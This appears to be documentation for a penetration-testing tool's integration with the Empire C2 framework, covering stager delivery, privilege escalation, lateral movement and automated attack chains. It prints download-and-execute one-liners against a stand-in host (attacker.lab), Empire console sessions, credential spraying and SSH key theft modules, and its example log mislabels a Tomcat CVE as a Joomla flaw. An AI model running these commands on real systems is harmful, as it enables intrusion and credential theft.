---
title: Empire C2 Integration
audience: [operators, contributors, agents]
primary: operators
stability: stable
last_audited: 2026-05
related:
  - docs/C2_INTEGRATION.md
  - docs/POST_EXPLOITATION.md
  - .github/copilot-instructions.md
---

# Empire C2 Integration

> **Overview.** Drederick integrates with
> [BC-SECURITY/Empire](https://github.com/BC-SECURITY/Empire/) — a full-featured
> post-exploitation C2 framework — for agent delivery, multi-module execution
> (privilege escalation, lateral movement), and session orchestration. This document
> covers agent types, deployment workflows, module strategies, and common
> operational patterns.

<a id="architecture-overview"></a>
## Architecture Overview

Empire integration follows a three-stage payload chain:

```
[Recon/Exploitation] → [Agent Stager] → [Empire Listener] → [Agent Callback] → [Post-Ex Modules]
```

1. **Recon/Exploitation phase:** Drederick's scanner suite identifies RCE opportunities
   (vulnerable services, weak credentials, misconfigurations).

2. **Agent Stager** (`EmpireAgentStager`): Platform-aware payload generation.
   - **Windows**: PowerShell-based agent (Empire default)
   - **Linux**: Python-based agent (compatible with Python 2/3)
   - **macOS**: Bash/sh fallback (Empire one-liner)
   - Output: raw stager code + delivery mechanism (HTTP, DNS, SMB)

3. **Empire Listener** (user-provisioned, not auto-started): HTTP/HTTPS listener awaiting agent callback.
   - Listens on configured host:port (e.g., `http://attacker.lab:8080/`)
   - Receives agent check-ins and dispatches commands

4. **Agent Callback**: Stager executes on target → calls back to listener → becomes active agent in Empire.
   - Empire tracks agent: `<agent_id>`, platform, username, hostname, processes

5. **Post-Ex Modules**: Chain of privilege escalation, lateral movement, and enumeration.
   - **Privilege Escalation**: `windows/escalate/bypassuac`, `windows/privesc/seimpersonate_potato`,
     `linux/escalate/sudo_privesc`, `linux/escalate/suid_finder`
   - **Lateral Movement**: `windows/lateral/invoke_psremoting`, `windows/lateral/invoke_wmi`,
     `linux/lateral/ssh_add_authorized_keys`
   - **Enumeration**: `windows/enum/enum_services`, `linux/enum/enum_network`

<a id="agent-types"></a>
## Agent Types

| Type | Platform | Requirements | Speed | Features |
| ---- | -------- | ------------ | ----- | -------- |
| **PowerShell** (default Windows) | Windows | PowerShell v2+ | Fast | AMSI bypass, UAC handling, full Win32 API |
| **Stager (Windows)** | Windows | cmd.exe | Fast | Bootstrap → full agent download |
| **Python 3** (default Linux) | Linux/macOS | Python 3.6+ | Medium | Multithreaded, cross-platform |
| **Python 2** (legacy Linux) | Linux/macOS | Python 2.7 | Medium | Older systems, Metasploitable |
| **Bash** (fallback) | Linux/macOS | bash/sh | Slow | No dependencies, lowest common denominator |

<a id="deployment-workflow"></a>
## Deployment Workflow

### Stage 1: Identify RCE

```bash
drederick --scope <scope_file> --target <target_subnet> --out out/
# Scans yield: vulnerable service + credential/RCE path
# Example: Apache Tomcat 8.5.50 (CVE-2020-1938) → exec() capability on <target>
```

Drederick's exploit toolbox may deliver pre-authenticated RCE directly (via Nuclei, Metasploit,
custom PoC) or identify a valid credential pair (spray, brute-force, LDAP null bind).

### Stage 2: Generate Empire Stager

```bash
# Via Autopilot (automatic):
drederick --autopilot --scope <scope> --target <target> --out out/

# Via manual invocation (operator control):
drederick run-exploit --tool empireStager --target <host> --platform windows --out out/<host>/

# Operator copy-pastes raw payload code to target (HTTP POST, bash -c, powershell -Command, etc.)
```

**Output:** Raw stager code (PowerShell one-liner, Python script, bash payload)
written to `out/<host>/empire_stager_<timestamp>.ps1|.py|.sh`.

### Stage 3: Execute Stager & Callback

**On target** (operator pastes stager):
```powershell
# Windows PowerShell example
powershell -NoProfile -NonInteractive -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.lab:8080/stager')"

# Empire's stager downloads full agent, injects into memory, begins callback loop
```

```bash
# Linux bash example
bash -c 'python -c "import requests; exec(requests.get(\"http://attacker.lab:8080/stager\").text)"'
```

**On Empire Listener** (attacker's C2 server):
```
[*] Received agent callback from 192.168.1.100 (username: admin, hostname: WEBSERVER01)
[*] Agent registered: 3KWJXK8L [Windows PowerShell]
[*] Initial checkin received.
```

### Stage 4: Schedule Post-Ex Modules

**Automated** (Autopilot + KnowledgeBase):
```csharp
// EmpireModuleExecutor picks high-value modules based on findings
// Privilege escalation (if not SYSTEM): SeImpersonate → Potato, UAC bypass
// Lateral movement (if additional hosts in scope): credential spray, WMI/PSRemoting
// All re-check scope before execution
```

**Manual** (operator in Empire console):
```
[agent-3KWJXK8L] > info windows/escalate/bypassuac_servertech
[INFO] Targets UAC bypass on Windows Server 2012/2016 via ServerTech auth
[agent-3KWJXK8L] > use windows/escalate/bypassuac_servertech
[agent-3KWJXK8L] > set TARGET 192.168.1.100
[agent-3KWJXK8L] > run
[*] Executing module...
[*] UAC bypass successful, elevated to SYSTEM.
```

<a id="module-matrix"></a>
## Module Matrix: Privilege Escalation & Lateral Movement

### Windows Privesc Modules

| Module | Vulnerability | Prerequisites | Success Signal |
| ------ | -------------- | ------------- | --------------- |
| `windows/escalate/bypassuac_servertech` | ServerTech auth token reuse | Unprivileged user, x64 process | whoami returns SYSTEM |
| `windows/escalate/seimpersonate_potato` | SeImpersonate → Potato exploit | SeImpersonate privilege present | SYSTEM shell callback |
| `windows/escalate/bypassuac_token_duplication` | Token duplication (Alt+Tab) | Unprivileged, SeImpersonate | SYSTEM shell |
| `windows/escalate/get_token_impersonation` | Token enumeration for impersonation | SeImpersonate, process access | Lists impersonation tokens |
| `windows/escalate/rotten_potato` | Legacy Potato (older OS targets) | SeImpersonate, Windows 7-2012 | SYSTEM shell |

### Linux Privesc Modules

| Module | Vulnerability | Prerequisites | Success Signal |
| ------ | -------------- | ------------- | --------------- |
| `linux/escalate/sudo_privesc` | Sudo + NOPASSWD or known password | Sudo entry exists | UID 0 shell |
| `linux/escalate/suid_finder` | SUID binary exploitation | Misconfigured SUID binary | UID 0 shell |
| `linux/escalate/polkit_dbus` | Polkit D-Bus privilege escalation | Polkit service + auth bypass | UID 0 shell |
| `linux/escalate/kernel_exploit` | Kernel vulnerability (CVE-driven) | Vulnerable kernel version | UID 0 shell / local priv esc |

### Lateral Movement Modules

| Module | Attack Type | Prerequisites | Target Type |
| ------ | ----------- | ------------- | ----------- |
| `windows/lateral/invoke_psremoting` | WinRM multi-hop | PSRemoting enabled, valid creds | Windows (remote RCE) |
| `windows/lateral/invoke_wmi` | WMI remote execution | DCOM/WMI enabled, valid creds | Windows (remote RCE) |
| `windows/lateral/invoke_dcom` | DCOM lateral movement | DCOM enabled, valid creds | Windows (remote RCE) |
| `linux/lateral/ssh_add_authorized_keys` | SSH key-based access | SSH service, valid creds | Linux (persistent SSH) |
| `linux/lateral/steal_ssh_keys` | Steal SSH private keys | SSH keys readable from filesystem | Linux (steal keys for pivot) |

### Enumeration Modules

| Module | Discovery Type | Output |
| ------ | -------------- | ------ |
| `windows/enum/enum_services` | Service enumeration | Service name, status, binary path |
| `windows/enum/enum_network` | Network enumeration | Local interfaces, routes, connections |
| `linux/enum/find_files` | File discovery | Sensitive files (passwd, shadow, .ssh) |
| `linux/enum/enum_suid` | SUID binaries | Misconfigurations for privesc |

<a id="operational-patterns"></a>
## Operational Patterns

### Pattern 1: Post-RCE Agent Deployment

**Scenario:** Nuclei finds vulnerable Joomla → RCE via `mod_system`. Want full post-ex capability.

```csharp
// Drederick Autopilot:
var planner = new ExploitationPlanner(scope, audit, permissions);
var action = planner.Plan(findings)[0];  // RCE via Joomla
await exploitRunner.ExecuteAsync(action);  // Nuclei RCE executes

// Post-RCE: deploy Empire agent
var stager = new EmpireAgentStager(scope, audit);
var result = await stager.GenerateAsync("192.168.1.50", Platform.Linux, ct);
// Deliver to target via stdout of Nuclei RCE
// Agent callbacks to Empire listener
// KnowledgeBase records: empire_agents += { target: "192.168.1.50", agent_id: "...", platform: Linux }
```

### Pattern 2: Privilege Escalation Chain

**Scenario:** Agent on 192.168.1.100 has SeImpersonate. Need SYSTEM for lateral movement.

```csharp
// EmpireModuleExecutor:
var findings = await sessionManager.EnumerateAsync("agent-123", ct);
// PostExWindows detects: SeImpersonate privilege, user is not SYSTEM

var executor = new EmpireModuleExecutor(scope, audit, moduleLibrary);
var result = await executor.ExecutePrivescAsync("192.168.1.100", findings, ct);
// Selects module: windows/escalate/seimpersonate_potato
// Re-checks scope: 192.168.1.100 ✓ in scope
// Executes in Empire: [agent-123] > use windows/escalate/seimpersonate_potato
// Success: agent now runs as SYSTEM
// Records to KnowledgeBase: Hosts["192.168.1.100"].PostExFindings += { privileged: true, method: "potato" }
```

### Pattern 3: Cross-Run Memory

**Scenario:** First run identified 10 hosts + escalated on 5. Second run should skip escalation, focus on lateral.

```csharp
// On run 2:
var kb = KnowledgeBase.Load("memory/findings.json");
var hosts = kb.Hosts.Values
    .Where(h => h.PostExFindings.Any(f => f.Privileged == true))
    .ToList();
// Loads: [ 192.168.1.10, 192.168.1.20, 192.168.1.30, 192.168.1.40, 192.168.1.50 ]

// Planner skips privesc modules for these hosts, focuses on lateral
var planLateral = planner.Plan(findings, creds, permissions)
    .Where(a => a.Tool == "empireLateral")
    .ToList();
// Lateral movement chain: credential spray → WMI invoke → agent callback → repeat
```

<a id="troubleshooting"></a>
## Troubleshooting

### Agent Callback Timeout

**Symptom:** Stager executes, but agent never checks in to Empire listener.

**Diagnosis:**
1. Verify listener is running: `[*] Started listener on http://attacker.lab:8080/`
2. Check target firewall: can target reach attacker.lab:8080?
3. Verify platform match: PowerShell stager on Linux won't work (falls back to bash)

**Fix:**
- Confirm listener host/port in stager generation
- Test target connectivity: `curl http://attacker.lab:8080/test` from target
- Use Python agent on Linux if bash stager fails

### Module Execution Fails (Unknown Module)

**Symptom:** `[ERROR] Module 'windows/escalate/seimpersonate_potato' not found`

**Diagnosis:** Empire installation incomplete or custom module path not configured.

**Fix:**
```bash
# In Empire container/install:
cd /opt/Empire
pip install -r requirements.txt
python3 empire/server/server.py
```

### Privilege Escalation Ineffective

**Symptom:** Potato exploit runs, but user remains unprivileged.

**Diagnosis:**
- SeImpersonate not actually present (misidentified by post-ex)
- Token binding already used by another process
- OS patch level too new (Potato patched on Windows Server 2016+)

**Fix:**
- Verify: `whoami /groups | find "SeImpersonate"` on target
- Try alternative: `windows/escalate/bypassuac_token_duplication`
- Escalate via web server privilege (Tomcat → SYSTEM, IIS → NetworkService → SYSTEM)

### Lateral Movement Blocked

**Symptom:** WMI lateral move executed, but connection refused.

**Diagnosis:**
- DCOM disabled in target environment
- Firewall (RPC ports 135, 445, dynamic range blocked)
- Invalid credentials (password changed since first compromise)

**Fix:**
- Confirm credentials are fresh: re-run password spray on target
- Try alternate: `windows/lateral/invoke_psremoting` (different transport)
- Enumerate available methods: `windows/enum/enum_connectivity`

<a id="examples"></a>
## Examples

### Example 1: Automated Joomla → Empire → Privesc Chain

```bash
drederick \
  --scope joomla-lab.txt \
  --target 192.168.1.0/24 \
  --autopilot \
  --allow-payloads \
  --out out/
```

**Output log:**
```
[*] Scanning 192.168.1.50 (Joomla instance)
[*] Nuclei found: CVE-2020-1938 RCE via mod_system
[*] Exploiting: /component/com_system/...
[*] RCE shell on 192.168.1.50
[+] Autopilot Phase 1: Post-ex enumeration
[*] Detected: SeImpersonate privilege (user: www-data)
[+] Autopilot Phase 2: Empire agent delivery
[*] Generated stager: python (Linux)
[*] Delivered via RCE: python stager
[*] Agent callback: 3KWJXK8L [192.168.1.50]
[+] Autopilot Phase 3: Privilege escalation
[*] Empire module: windows/escalate/seimpersonate_potato (not applicable on Linux)
[*] Empire module: linux/escalate/sudo_privesc (www-data in sudoers)
[*] Executed module: sudo -u root /bin/bash -c "..."
[+] Escalation successful → UID 0
[+] Autopilot Phase 4: Lateral movement
[*] Credential spray: ubuntu/ubuntu on 192.168.1.0/24
[*] Lateral move: SSH to 192.168.1.51 (Ubuntu server)
[*] New agent callback: 4LMWQW2K [192.168.1.51]
[+] Autopilot finished: 2 agents, 1 escalation, 1 lateral move
```

### Example 2: Manual Module Execution

```csharp
// Operator code (not in Drederick, but shows integration point):
var executor = new EmpireModuleExecutor(scope, audit, moduleLibrary);

// Retrieve findings from prior enumeration
var findings = new HostFinding { Target = "192.168.1.100" };
findings.PostExFindings = new()
{
    new() { Privileged = false, User = "WEBSERVER$", Privileges = "SeImpersonate" }
};

// Execute privesc module
var result = await executor.ExecutePrivescAsync("192.168.1.100", findings, ct);

if (result.Success)
{
    Console.WriteLine($"Escalated to: {result.Output}");
    kb.RecordEmpireModuleSuccess("192.168.1.100", result.ModuleName, result.Output);
}
```

### Example 3: Cross-Run Continuation

**Run 1:**
```bash
drederick --scope lab.txt --target 10.0.0.0/8 --autopilot --out out/
# Results: 15 hosts compromised, 8 escalated, 3 lateral moves
# Recorded to memory/findings.json
```

**Run 2 (next day, focus on high-value targets):**
```bash
drederick --scope lab.txt --target 10.0.0.0/8 --autopilot --out out/
# Loads memory/findings.json
# Skips re-escalation on already-SYSTEM hosts
# Focuses on: credential reuse → new hosts → new lateral moves
```

<a id="limitations"></a>
## Limitations & Future Work

### Current Limitations
1. **Listener auto-start:** Empire listener must be running manually. Drederick does not start/stop C2 server.
2. **Module corpus:** Hardcoded module suggestions (string matching). Real implementation should integrate with Empire's `core/handlers` API.
3. **Callback routing:** Single listener required. Multi-listener / listener failover not yet implemented.
4. **Agent auto-sleep:** Agents callback continuously. Operator must disable via `agent <id> command sleep <minutes>`.
5. **Stealth:** No OPSEC hardening in stagers (encoding, obfuscation, certificate pinning).

### Future Enhancements
- **Listener orchestration:** Auto-start Empire server, return listener URL to stager
- **Module API integration:** Query `empire/handlers` for available modules, match against findings
- **Callback tunneling:** Route agent callbacks through Drederick's network isolation layer
- **OPSEC profiles:** Template stagers with obfuscation, certificate pinning, jitter
- **Lateral move simulation:** Pre-flight test lateral movement paths before execution

